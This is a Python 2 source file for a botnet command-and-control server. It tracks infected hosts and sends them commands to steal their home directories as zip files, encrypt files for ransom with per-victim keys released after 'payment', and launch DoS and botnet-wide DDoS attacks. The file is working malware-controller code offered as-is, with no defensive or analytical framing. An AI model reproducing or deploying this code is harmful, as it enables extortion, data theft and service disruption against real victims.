import socket
import os
import random
import string
from messenger import *
from threading import Thread
from time import sleep

LISTEN_PORT = 3838
VICTIM_PORT = 4848

keys = {}

def send_steal_attack(payload):
    infected_ip = str(payload.split(",")[1])
    print "Beginning to steal %s's HOME directory" % infected_ip
    msg_contents = "STEAL"
    Messenger.send_message(infected_ip, VICTIM_PORT, msg_contents)
    print "Message Sent"


def ransomeware_attack(payload):
    print "Beginning Ransomeware Attack"
    infected_ip = str(payload.split(",")[1])
    if infected_ip in keys:
        return # already attacked
    key = ''.join(random.choice(string.ascii_lowercase) for _ in range(16))
    keys[infected_ip] = key
    msg_contents = "RANSOMEWARE," + key
    Messenger.send_message(infected_ip, VICTIM_PORT, msg_contents)
    print "Encypted Files"


def send_decrypt_key(payload):
    print "Receieved Payment"
    print "Sending Key to unencrypt files"
    infected_ip = str(payload.split(",")[1])
    if infected_ip not in keys:
        return # did not attack yet
    msg_contents = "DECRYPT," + keys[infected_ip]
    Messenger.send_message(str(infected_ip), VICTIM_PORT, msg_contents)


def send_dos_attack(payload):
    infected_ip = str(payload.split(",")[1])
    msg_contents = "DOS," + ",".join(str(i) for i in payload.split(",")[2:])
    Messenger.send_message(infected_ip, VICTIM_PORT, msg_contents)
    print "DOS'ed: %s" % str(msg_contents)


def send_ddos_attack(payload):
    target_ip = str(payload.split(",")[1])
    msg_contents = "DOS," + target_ip + ',' + payload.split(',')[2]
    for bot in botnet:
        Messenger.send_message(bot, VICTIM_PORT, msg_contents)
    print "DDOS'd attack to ip: %s" % str(target_ip)


def add_new_victim(victim_ip, response):
    # response contains the JOIN message
    print "Adding %s to our Infected List" % str(victim_ip)
    botnet.append(str(victim_ip))


def list_infected():
    for infected in botnet:
        print "Infected: %s" % str(infected)


def process_zip_file(victim_ip, file_contents):
    print "Got the file from %s" % victim_ip
    with open("Python_received.zip", "w") as f:
        f.write(str(file_contents[2:]))


def listen_for_response():
    s = Messenger.set_up_listening_socket(LISTEN_PORT)
    while True:
        data, victim = s.recvfrom(1000000)
        print "Response from IP: %s" % (str(victim[0]))
        msg_type = str(data).split(",")[0]
        response_dict[msg_type](str(victim[0]), str(data))
    s.close()


def quit_all():
    os.system('kill -9 %d' % os.getpid())


def main():
    global botnet
    botnet = []

    listen_thread = Thread(None, listen_for_response,)
    listen_thread.start()

    while True:
        command = str(raw_input("Enter a command to run: ")).replace(" ", "")
        try:
            if len(command) == 4:
                # Either a LIST or EXIT command
                command_dict[command]()
            else:
                command_type = str(command.split(",")[0])
                command_dict[command_type](command)
        except:
            print ("Invalid. Try again")

    listen_thread.join()

# NEED TO CHANGE THIS INTO 2 DIFFERENT DICTS
# COMMAND DICT
# RESPONSE DICT
command_dict = {"LIST": list_infected,
                "DOS": send_dos_attack,
                "RANS": ransomeware_attack,
                "DECRYPT": send_decrypt_key,
                "DDOS": send_ddos_attack,
                "STEAL": send_steal_attack,
                "EXIT": quit_all
                }
response_dict = {"JOIN": add_new_victim,
                 "D": process_zip_file
                 }

if __name__ == '__main__':
    main()
